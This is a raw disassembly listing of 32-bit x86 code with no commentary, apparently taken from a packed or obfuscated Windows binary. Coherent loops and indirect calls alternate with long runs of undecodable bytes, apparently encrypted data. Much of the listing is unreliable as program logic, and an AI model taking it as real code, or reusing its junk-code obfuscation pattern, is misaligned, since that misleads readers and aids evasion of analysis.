  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073b1
  407387:	das    
  407388:	repnz ror BYTE PTR [edx],cl
  40738b:	ret    0x7e7e
  40738e:	add    eax,0xf7e7e7c
  407393:	rol    BYTE PTR [ebp-0x3d],cl
  407396:	lods   al,BYTE PTR ds:[esi]
  407397:	mov    dl,0x7
  407399:	test   DWORD PTR [esi+0x562da74],0x5e2ccc5c
  4073a3:	mov    ebp,0x7c2a08e8
  4073a8:	push   edi
  4073a9:	je     0x4073e0
  4073ab:	repz pop DWORD PTR [ebx-0x4d]
  4073af:	jecxz  0x407381
  4073b1:	mov    ebp,0x1784683c
  4073b6:	push   ds
  4073b7:	cdq    
  4073b8:	pop    ecx
  4073b9:	int    0xcc
  4073bb:	inc    esp
  4073bc:	mov    cl,0x1a
  4073be:	call   0x5936:0x48506add
  4073c5:	in     al,0xf4
  4073c7:	jne    0x40741b
  4073c9:	push   ebx
  4073ca:	aad    0xf2
  4073cc:	dec    esi
  4073cd:	push   cs
  4073ce:	fistp  DWORD PTR [esi]
  4073d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d1:	mov    ch,0x82
  4073d3:	cmp    DWORD PTR [edx+edi*2-0x8],0x55
  4073d8:	aad    0x2
  4073da:	test   DWORD PTR [edi],0x93c27339
  4073e0:	lea    ebp,[ecx-0x6]
  4073e3:	aas    
  4073e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e5:	mov    ebx,eax
  4073e7:	loope  0x40743b
  4073e9:	jnp    0x40742b
  4073eb:	adc    esp,DWORD PTR [edi+0x43]
  4073ee:	shl    edx,0x75
  4073f1:	xchg   DWORD PTR [ecx],eax
  4073f3:	loope  0x40744e
  4073f5:	mov    ds:0xa4aa57d8,al
  4073fa:	pop    es
  4073fb:	cld    
  4073fc:	dec    edx
  4073fd:	sub    ebp,DWORD PTR [esi+0x7a]
  407400:	lahf   
  407401:	test   ebp,edx
  407403:	push   eax
  407404:	push   esp
  407405:	mov    esi,DWORD PTR [ebx+0x439e41e1]
  40740b:	pop    esp
  40740c:	(bad)  
  40740d:	(bad)  
  40740e:	xlat   BYTE PTR ds:[ebx]
  40740f:	xchg   DWORD PTR [ebx+ebx*4],edi
  407412:	xchg   edi,eax
  407413:	ret    0xf818
  407416:	ins    BYTE PTR es:[edi],dx
  407417:	jno    0x4073fd
  407419:	dec    ecx
  40741a:	int3   
  40741b:	inc    esp
  40741c:	fs mov al,0x46
  40741f:	inc    ecx
  407420:	push   eax
  407421:	cmp    ebx,DWORD PTR [eax+edi*1+0x67]
  407425:	adc    eax,0xb09314ec
  40742a:	and    dl,BYTE PTR [edi+0x1b6f9b3e]
  407430:	push   edi
  407431:	mov    esp,DWORD PTR [edi]
  407433:	add    eax,0xc5a974d9
  407438:	mov    ?,WORD PTR [esi]
  40743a:	xor    eax,0x94aff1da
  40743f:	adc    ch,BYTE PTR [ebp-0x5f716d99]
  407445:	in     al,0xa
  407447:	inc    ebx
  407448:	nop
  407449:	dec    edi
  40744a:	imul   ebx,DWORD PTR ds:0x67b03c5b,0xf361b39a
  407454:	xchg   ebp,eax
  407455:	aaa    
  407456:	sub    al,0x32
  407458:	push   esi
  407459:	es ins DWORD PTR es:[edi],dx
  40745b:	cmp    al,0xf2
  40745d:	shl    DWORD PTR [edx],cl
  40745f:	inc    eax
  407460:	sti    
  407461:	retf   0x520f
  407464:	xor    edi,eax
  407466:	test   BYTE PTR [eax+0x54],bh
  407469:	inc    esp
  40746a:	daa    
  40746b:	xchg   ecx,eax
  40746c:	or     al,0xdd
  40746e:	add    DWORD PTR [ecx+0x2a47a448],ebx
  407474:	cld    
  407475:	xchg   BYTE PTR [edx+0x4],dh
  407478:	(bad)  
  407479:	fadd   QWORD PTR [ebp+0x7b7499c2]
  40747f:	or     BYTE PTR [ecx],ah
  407481:	push   eax
  407482:	or     al,0x2f
  407484:	jbe    0x4074e3
  407486:	outs   dx,DWORD PTR ds:[esi]
  407487:	iret   
  407488:	and    BYTE PTR [ebp-0x64c21ab1],0x11
  40748f:	xchg   BYTE PTR [edx+0x63],dl
  407492:	adc    ecx,esi
  407494:	xchg   edx,edi
  407496:	push   0x35
  407498:	push   es
  407499:	outs   dx,BYTE PTR ds:[esi]
  40749a:	inc    edi
  40749b:	int    0xb6
  40749d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749e:	test   BYTE PTR [edi+0x16],cl
  4074a1:	das    
  4074a2:	rol    BYTE PTR ds:0xa4864f06,1
  4074a8:	mov    esp,0xe1ee1f32
  4074ad:	mov    ebx,0xefef2a9d
  4074b2:	mov    ds:0x3101f0e,al
  4074b7:	cdq    
  4074b8:	inc    ecx
  4074b9:	pop    esp
  4074ba:	cld    
  4074bb:	not    edx
  4074bd:	xchg   BYTE PTR [esp+ebp*4-0x1096765f],bh
  4074c4:	and    eax,edi
  4074c6:	sub    ebp,DWORD PTR [ecx]
  4074c8:	xchg   esi,eax
  4074c9:	cmc    
  4074ca:	push   0xffffffb0
  4074cc:	iret   
  4074cd:	iret   
  4074ce:	or     dh,BYTE PTR [eax]
  4074d0:	out    dx,al
  4074d1:	retf   0x48dc
  4074d4:	jmp    0x407523
  4074d6:	jnp    0x4074a1
  4074d8:	xchg   ebp,eax
  4074d9:	loopne 0x40754c
  4074db:	jnp    0x4074b6
  4074dd:	and    BYTE PTR [edi],al
  4074df:	mov    eax,ds:0x4213edc
  4074e4:	das    
  4074e5:	jmp    DWORD PTR [ebp+0x277e342a]
  4074eb:	xchg   esi,eax
  4074ec:	aaa    
  4074ed:	mov    edi,0xd6052584
  4074f2:	mov    WORD PTR [esp+ecx*4-0x4764c49f],es
  4074f9:	ja     0x40757a
  4074fb:	cld    
  4074fc:	cmp    eax,0x71071c68
  407501:	mov    al,0x4f
  407503:	popa   
  407504:	pop    edx
  407505:	test   ax,0x606c
  407509:	or     DWORD PTR [eax],ecx
  40750b:	xchg   ecx,eax
  40750c:	(bad)  
  40750e:	and    eax,0xcb74cba1
  407513:	jl     0x407551
  407515:	enter  0x253a,0xf4
  407519:	test   DWORD PTR [ecx+0x65],ebx
  40751c:	inc    eax
  40751d:	das    
  40751e:	bound  edx,QWORD PTR [ecx]
  407520:	sub    eax,0xbfb52f20
  407525:	mov    edi,0x5b9e38d1
  40752a:	sbb    eax,esp
  40752c:	rol    esp,cl
  40752e:	pop    esp
  40752f:	xor    ebx,DWORD PTR [esi-0x7b63fca8]
  407535:	xor    DWORD PTR [eax-0x4d6b0199],edi
  40753b:	pop    ebx
  40753c:	push   0x78
  40753e:	pop    esp
  40753f:	icebp  
  407540:	jmp    0xccc9:0xedf5e1c8
  407547:	(bad)  
  407548:	dec    edi
  407549:	imul   ebp,DWORD PTR ds:0x479f7545,0xffffffd2
  407550:	sub    dh,BYTE PTR [esi-0x2bca8063]
  407556:	hlt    
  407557:	in     eax,dx
  407558:	enter  0x9960,0x3a
  40755c:	cmp    al,0x7
  40755e:	out    dx,eax
  40755f:	cld    
  407560:	mov    WORD PTR [ecx+0x3c],?
  407563:	mov    dh,0x9b
  407565:	xor    eax,0xb604b830
  40756a:	push   ebx
  40756b:	repz pop ds
  40756d:	sahf   
  40756e:	test   BYTE PTR [di],al
  407571:	shl    DWORD PTR [edx+0x354e8e03],cl
  407577:	and    bl,BYTE PTR [edx-0x1a]
  40757a:	mov    ch,0x41
  40757c:	test   eax,0xd208c4f8
  407581:	inc    edx
  407582:	inc    ebx
  407583:	out    0x68,al
  407585:	in     eax,0x97
  407587:	and    eax,0xeaebf685
  40758c:	push   ebx
  40758d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40758e:	mov    cl,0xed
  407590:	stos   DWORD PTR es:[edi],eax
  407591:	out    dx,eax
  407592:	xchg   ecx,eax
  407593:	sbb    eax,0x89b987a9
  407598:	pop    es
  407599:	rcl    DWORD PTR [esi+ebp*1],1
  40759c:	add    eax,0x31ec45c7
  4075a1:	test   DWORD PTR [eax+edi*8+0x55135],ebx
  4075a8:	add    BYTE PTR [eax+0x9577],bh
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	sub    al,0xac
  407657:	iret   
  407658:	(bad)  
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x847e7e7c
  407662:	adc    eax,0xed29db2f
  407667:	dec    ecx
  407668:	les    ebx,FWORD PTR [eax+0x77]
  40766b:	push   0x9dc579a6
  407670:	xor    al,0xe6
  407672:	mov    ebp,0xd2fdaf3e
  407677:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407679:	les    ebx,FWORD PTR [edx+0x6d]
  40767c:	rol    BYTE PTR [ebp+0x9],cl
  40767f:	xor    DWORD PTR [edi-0x65],ebp
  407682:	aaa    
  407683:	(bad)  
  407685:	push   eax
  407686:	loopne 0x407656
  407688:	dec    ecx
  407689:	adc    BYTE PTR [edi-0x26],0x37
  40768d:	inc    esp
  40768e:	(bad)  
  40768f:	sbb    al,BYTE PTR [esi]
  407691:	sbb    al,0x38
  407693:	popa   
  407694:	shr    bl,1
  407696:	aad    0xb6
  407698:	lods   al,BYTE PTR ds:[esi]
  407699:	imul   esi,DWORD PTR [esi],0x4d59aca5
  40769f:	and    DWORD PTR [esi+edx*4],ebx
  4076a2:	daa    
  4076a3:	out    dx,al
  4076a4:	idiv   DWORD PTR [ebp+0x7e]
  4076a7:	or     bh,BYTE PTR [edi]
  4076a9:	lahf   
  4076aa:	add    BYTE PTR [edx+esi*2-0x4d],0xd1
  4076af:	pop    edx
  4076b0:	push   cs
  4076b1:	push   ss
  4076b2:	repnz pop esp
  4076b4:	inc    esi
  4076b5:	in     eax,dx
  4076b6:	or     eax,0x440ab58
  4076bb:	call   0x9387:0xcbcec66b
  4076c2:	or     eax,0x822ec663
  4076c7:	loope  0x40771b
  4076c9:	ds xchg edx,eax
  4076cb:	mov    ?,WORD PTR [edi]
  4076cd:	das    
  4076ce:	mov    bl,BYTE PTR [esi+0x1d]
  4076d1:	fiadd  DWORD PTR [eax+ecx*4-0x23e219ca]
  4076d8:	es movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  4076db:	in     al,0xa8
  4076dd:	lea    ecx,[ebx]
  4076df:	xor    bl,BYTE PTR ds:0x6f54a64
  4076e5:	call   0x8335e2f4
  4076ea:	outs   dx,BYTE PTR ds:[esi]
  4076eb:	cmc    
  4076ec:	es retf 0xed69
  4076f0:	popa   
  4076f1:	outs   dx,DWORD PTR ds:[esi]
  4076f2:	ss cld 
  4076f4:	dec    esi
  4076f5:	in     al,dx
  4076f6:	ror    BYTE PTR [ebp-0x1],cl
  4076f9:	hlt    
  4076fa:	push   cs
  4076fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076fc:	jecxz  0x407716
  4076fe:	rcr    bl,cl
  407700:	call   0xc7a8:0x188cdd52
  407707:	je     0x4076cd
  407709:	(bad)  
  40770a:	jbe    0x40777f
  40770c:	int3   
  40770d:	std    
  40770e:	cmc    
  40770f:	scas   eax,DWORD PTR es:[edi]
  407710:	xor    eax,0xbf86964c
  407715:	push   ecx
  407716:	pop    ss
  407717:	dec    eax
  407718:	cmp    eax,0xf39dcb32
  40771d:	mov    al,ds:0x26d2f2f9
  407722:	aam    0x29
  407724:	scas   al,BYTE PTR es:[edi]
  407725:	push   ebp
  407726:	in     eax,dx
  407727:	lods   eax,DWORD PTR ds:[esi]
  407728:	sbb    DWORD PTR [edx],eax
  40772a:	jmp    0x7da7:0xbd646fd1
  407731:	inc    edx
  407732:	fsub   DWORD PTR [eax+0x74f590d0]
  407738:	inc    eax
  407739:	idiv   DWORD PTR [ebx+0x3c3fd8ef]
  40773f:	or     eax,0xab73c5e6
  407744:	jmp    0x5b98:0x654c7d7a
  40774b:	sar    DWORD PTR [ebx-0x6c],1
  40774e:	stos   DWORD PTR es:[edi],eax
  40774f:	pop    eax
  407750:	pop    ecx
  407751:	inc    eax
  407752:	push   esp
  407753:	icebp  
  407754:	adc    eax,0x421a8fe3
  407759:	sub    al,BYTE PTR [edi]
  40775b:	adc    ecx,DWORD PTR [ebx+0x44]
  40775e:	push   ebp
  40775f:	es jmp 0x4077c3
  407762:	std    
  407763:	cmp    al,0xdd
  407765:	fcom   DWORD PTR [edi-0x7e]
  407768:	arpl   WORD PTR [edi+0x2b],bp
  40776b:	out    0xda,al
  40776d:	adc    BYTE PTR [edx],dl
  40776f:	ror    ah,1
  407771:	in     eax,0xf3
  407773:	cs xchg edi,eax
  407775:	rol    BYTE PTR [ebx],cl
  407777:	lods   al,BYTE PTR ds:[esi]
  407778:	call   0xab3d874
  40777d:	jp     0x4077ae
  40777f:	clc    
  407780:	ins    BYTE PTR es:[edi],dx
  407781:	pushf  
  407782:	inc    esi
  407783:	nop
  407784:	adc    BYTE PTR [esi+0x6b],ch
  407787:	and    BYTE PTR [ecx],ch
  407789:	jecxz  0x4077cf
  40778b:	dec    ecx
  40778c:	rcl    BYTE PTR [esi*1+0xb9c760e],1
  407793:	std    
  407794:	inc    ecx
  407795:	push   0x4e66d3a4
  40779a:	jle    0x407777
  40779c:	xchg   esp,eax
  40779d:	dec    edi
  40779e:	stos   BYTE PTR es:[edi],al
  40779f:	inc    esp
  4077a0:	fsubr  QWORD PTR [ebx]
  4077a2:	or     cl,BYTE PTR [edi-0x43]
  4077a5:	push   es
  4077a6:	test   DWORD PTR [edi+0x54],ebp
  4077a9:	jns    0x407759
  4077ab:	push   eax
  4077ac:	pop    eax
  4077ad:	cs mov ah,0x57
  4077b0:	mov    eax,fs
  4077b2:	in     eax,dx
  4077b3:	int3   
  4077b4:	push   ecx
  4077b5:	mov    ebx,0x7782ea5f
  4077ba:	adc    esi,eax
  4077bc:	and    ebx,DWORD PTR [ebx-0x5a]
  4077bf:	fs xchg edi,eax
  4077c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c2:	arpl   WORD PTR ds:[ecx-0x18],bx
  4077c6:	icebp  
  4077c7:	out    0x7,eax
  4077c9:	xchg   ecx,eax
  4077ca:	xchg   ebp,eax
  4077cb:	push   ebp
  4077cc:	fs daa 
  4077ce:	pop    edx
  4077cf:	stos   DWORD PTR es:[edi],eax
  4077d0:	(bad)  
  4077d1:	int3   
  4077d2:	add    ecx,0xffffffef
  4077d5:	mov    dl,0xbf
  4077d7:	data16 mov dh,BYTE PTR [ebx+0x7ef1acf]
  4077de:	aam    0x8f
  4077e0:	dec    BYTE PTR [ebx+eax*1-0x66]
  4077e4:	test   BYTE PTR [edi-0x1c70f3e6],cl
  4077ea:	pop    esp
  4077eb:	pop    esi
  4077ec:	mov    ebp,0xd2459c9d
  4077f1:	jns    0x40777d
  4077f3:	test   DWORD PTR ds:0x80010c15,edx
  4077f9:	mov    ebx,0x91a89ce2
  4077fe:	retf   
  4077ff:	ins    DWORD PTR es:[edi],dx
  407800:	icebp  
  407801:	adc    esi,DWORD PTR [esi+eiz*4+0xd]
  407805:	jno    0x40780c
  407807:	inc    esi
  407808:	inc    ebp
  407809:	mov    ah,0xd1
  40780b:	adc    BYTE PTR [eax+eiz*8],cl
  40780e:	mov    ecx,0x40c9e122
  407813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407814:	mov    BYTE PTR [esi-0x3f00acd7],bl
  40781a:	xor    al,0xec
  40781c:	outs   dx,BYTE PTR ds:[esi]
  40781d:	jnp    0x40782d
  40781f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407820:	lock retf 0x5c41
  407824:	jg     0x4077e4
  407826:	xor    esi,ebx
  407828:	xchg   esi,eax
  407829:	push   ebp
  40782a:	lods   eax,DWORD PTR ds:[esi]
  40782b:	mov    ebp,0xd6953f70
  407830:	push   0xffffffae
  407832:	retf   0x72a8
  407835:	ret    
  407836:	sub    al,0x67
  407838:	jmp    0xd513:0xf8e3a00d
  40783f:	and    dl,BYTE PTR [edi+0x6b]
  407842:	pop    edi
  407843:	scas   eax,DWORD PTR es:[edi]
  407844:	sub    ecx,DWORD PTR cs:[edx+0x73]
  407848:	jbe    0x40785a
  40784a:	int    0x4
  40784c:	jp     0x407876
  40784e:	inc    eax
  40784f:	sub    BYTE PTR ds:0x1e986ba6,al
  407855:	adc    al,0x55
  407857:	fs int3 
  407859:	out    0xe2,eax
  40785b:	pop    edx
  40785c:	iret   
  40785d:	inc    esp
  40785e:	pop    eax
  40785f:	jmp    0x13ae:0x973a090b
  407866:	jne    0x4078bd
  407868:	jg     0x407842
  40786a:	inc    edx
  40786b:	(bad)  
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xb8,eax
  407922:	inc    ecx
  407923:	push   eax
  407924:	and    BYTE PTR [esi+ecx*8],0x7e
  407928:	jle    0x40792f
  40792a:	jl     0x4079aa
  40792c:	jle    0x407942
  40792e:	shl    DWORD PTR [eax],1
  407930:	int    0x1a
  407932:	test   cl,al
  407934:	cs loop 0x4079b0
  407937:	leave  
  407938:	mov    cs,WORD PTR [eax+0x53]
  40793b:	push   0xd2e8b4f0
  407940:	pop    edx
  407941:	dec    edi
  407942:	xor    BYTE PTR ds:0xd270e819,cl
  407948:	lock pushf 
  40794a:	dec    esi
  40794b:	push   ebp
  40794c:	mov    ebp,0xdee1bc63
  407951:	ds adc eax,0x1aebe937
  407957:	xchg   esp,eax
  407958:	ins    DWORD PTR es:[edi],dx
  407959:	mov    ch,0xb
  40795b:	adc    ebx,DWORD PTR [ecx+0x2d87801d]
  407961:	mov    al,ds:0x25f7279c
  407966:	clc    
  407967:	xchg   ecx,eax
  407968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407969:	xchg   esi,eax
  40796a:	jle    0x407935
  40796c:	pop    ebp
  40796d:	pop    ecx
  40796e:	inc    ebp
  40796f:	mov    eax,0x345e7c3
  407974:	cdq    
  407975:	lea    esi,[ecx+0x4bf6fc8d]
  40797b:	or     ah,BYTE PTR [edi+ecx*8+0x70086031]
  407982:	fwait
  407983:	neg    BYTE PTR [eax]
  407985:	cwde   
  407986:	mov    cl,0xd2
  407988:	push   ebp
  407989:	lock inc edx
  40798b:	ret    0x44cc
  40798e:	ins    DWORD PTR es:[edi],dx
  40798f:	jo     0x407915
  407991:	(bad)  
  407992:	lods   eax,DWORD PTR ds:[esi]
  407993:	stos   BYTE PTR es:[edi],al
  407994:	inc    ecx
  407995:	cmp    DWORD PTR [eax],esp
  407997:	pop    edx
  407998:	pop    ecx
  407999:	pop    edi
  40799a:	xor    DWORD PTR ds:0xaf7c9d91,0xc14ce91b
  4079a4:	popa   
  4079a5:	mov    eax,ds:0x85eec788
  4079aa:	jmp    0xffb:0x94c29be
  4079b1:	and    edi,DWORD PTR [ecx-0x292f78db]
  4079b7:	jno    0x4079eb
  4079b9:	xor    al,0x13
  4079bb:	and    eax,0x555d507c
  4079c0:	addr16 dec ebp
  4079c2:	mov    al,ds:0x2696e0a4
  4079c7:	iret   
  4079c8:	inc    edi
  4079c9:	dec    ebp
  4079cb:	daa    
  4079cc:	in     al,0x7
  4079ce:	jle    0x4079f2
  4079d0:	ret    0xeb50
  4079d3:	in     eax,0x47
  4079d5:	imul   edi,edi,0xd9cc429d
  4079db:	dec    eax
  4079dc:	ret    
  4079dd:	pusha  
  4079de:	(bad)  
  4079e0:	pop    ss
  4079e1:	retf   
  4079e2:	cmp    DWORD PTR ds:0x36346329,eax
  4079e8:	arpl   WORD PTR [eax],bx
  4079ea:	inc    edi
  4079eb:	mov    edi,0xf1174325
  4079f0:	ins    BYTE PTR es:[edi],dx
  4079f1:	les    ebp,FWORD PTR [eax+0x171d19ce]
  4079f7:	adc    eax,0x6d5b6c9d
  4079fc:	fdivr  DWORD PTR [edx]
  4079fe:	push   esi
  4079ff:	and    BYTE PTR [ecx+0x35085abb],dl
  407a05:	jg     0x4079e8
  407a07:	cld    
  407a08:	test   eax,0xf043ef4b
  407a0d:	popa   
  407a0e:	pop    esi
  407a0f:	cs mov esi,0xc01bdecf
  407a15:	or     BYTE PTR [edx],bl
  407a17:	loopne 0x407a34
  407a19:	nop
  407a1a:	outs   dx,BYTE PTR ds:[esi]
  407a1b:	and    BYTE PTR [edi+eiz*8+0x67],dl
  407a1f:	xor    DWORD PTR [ebp-0x30a73c03],ebp
  407a25:	mov    edx,0xdc5217c8
  407a2a:	push   esp
  407a2b:	inc    ecx
  407a2c:	rol    DWORD PTR [edx+edx*8-0x15],cl
  407a30:	out    0x71,eax
  407a32:	aad    0x50
  407a34:	mov    ds:0xc6102050,eax
  407a39:	pusha  
  407a3a:	mov    eax,0x1d89fc6c
  407a3f:	fisub  DWORD PTR [ecx]
  407a41:	xor    DWORD PTR ds:[ecx+0x61],ebp
  407a45:	cld    
  407a46:	ret    0xb2f2
  407a49:	or     cl,ah
  407a4b:	mov    ch,0xf2
  407a4d:	retf   
  407a4e:	(bad)  
  407a4f:	clc    
  407a50:	xchg   ecx,eax
  407a51:	pop    ebx
  407a52:	push   esi
  407a53:	sbb    eax,0x596082ed
  407a58:	fadd   QWORD PTR [edx]
  407a5a:	shl    bl,cl
  407a5c:	dec    BYTE PTR [ebx+ebp*2]
  407a5f:	and    al,0x95
  407a61:	imul   edx,ebp,0x66
  407a64:	mov    cl,0xda
  407a66:	sbb    esi,DWORD PTR [eax+0x3d]
  407a69:	stos   BYTE PTR es:[edi],al
  407a6a:	into   
  407a6b:	and    edi,DWORD PTR [esi]
  407a6d:	enter  0xaa3,0x59
  407a71:	mov    bh,0x7a
  407a73:	xor    ecx,DWORD PTR [ecx-0x42f77fc8]
  407a79:	jg     0x407a55
  407a7b:	push   ss
  407a7c:	jae    0x407ab9
  407a7e:	daa    
  407a7f:	cmp    eax,0x73487e5e
  407a84:	(bad)  
  407a85:	jne    0x407add
  407a87:	js     0x407a4f
  407a89:	test   DWORD PTR [eax-0x5094d821],0x93d3594a
  407a93:	xchg   esi,eax
  407a94:	fst    QWORD PTR [ecx-0x30ec32ad]
  407a9a:	lds    ebx,FWORD PTR [edx-0x6442e730]
  407aa0:	ror    DWORD PTR [ecx+0xdb75996],cl
  407aa6:	add    ch,BYTE PTR [edi-0x39c2e62]
  407aac:	jmp    0xfe02:0xe489ef2a
  407ab3:	jno    0x407b0d
  407ab5:	and    DWORD PTR [eax+0x26],edx
  407ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ab9:	mov    ecx,0xde619622
  407abe:	jmp    0x5c13:0x58dc191e
  407ac5:	ins    DWORD PTR es:[edi],dx
  407ac6:	in     eax,0x6e
  407ac8:	jecxz  0x407b3c
  407aca:	xchg   edx,eax
  407acb:	jne    0x407a4e
  407acd:	cdq    
  407ace:	pop    ds
  407acf:	popf   
  407ad0:	cmp    al,0x6b
  407ad2:	xchg   edx,eax
  407ad3:	dec    eax
  407ad4:	dec    ebp
  407ad5:	pop    ds
  407ad6:	imul   DWORD PTR [esi]
  407ad8:	out    dx,eax
  407ad9:	inc    esi
  407ada:	gs aam 0x43
  407add:	mov    eax,0x3d7488b7
  407ae2:	jmp    0x82d1:0x3e4a5971
  407ae9:	hlt    
  407aea:	push   es
  407aeb:	call   0xeecc1a74
  407af0:	ss ss stc 
  407af3:	aaa    
  407af4:	inc    ebx
  407af5:	mov    al,0x4b
  407af7:	adc    al,0xc0
  407af9:	jmp    0x1e3b1a34
  407afe:	and    cl,BYTE PTR [ebx]
  407b00:	and    bl,BYTE PTR [eax]
  407b02:	xor    DWORD PTR [edi],0xffffffaa
  407b05:	xor    ebx,edx
  407b07:	sub    dh,BYTE PTR [eax]
  407b09:	repnz xchg edi,eax
  407b0b:	jmp    0x407aea
  407b0d:	inc    edi
  407b0e:	dec    ebx
  407b0f:	in     al,dx
  407b10:	push   ds
  407b11:	jmp    0x407b55
  407b13:	sub    bl,dl
  407b15:	mov    edi,0xef827a8
  407b1a:	or     BYTE PTR ds:0x55f6bcfa,bl
  407b20:	inc    edx
  407b21:	inc    edx
  407b22:	fisub  DWORD PTR [ebx-0x7b]
  407b25:	fistp  DWORD PTR [esi-0x12]
  407b28:	es lock mov dh,0x30
  407b2c:	mov    ah,0x90
  407b2e:	pop    edx
  407b2f:	fdiv   QWORD PTR [ebx-0x79]
  407b32:	pop    ecx
  407b33:	adc    cl,ah
  407b35:	stc    
  407b36:	inc    eax
  407b37:	jmp    0x407b6c
  407b39:	rol    DWORD PTR [ecx+0x4336ab15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
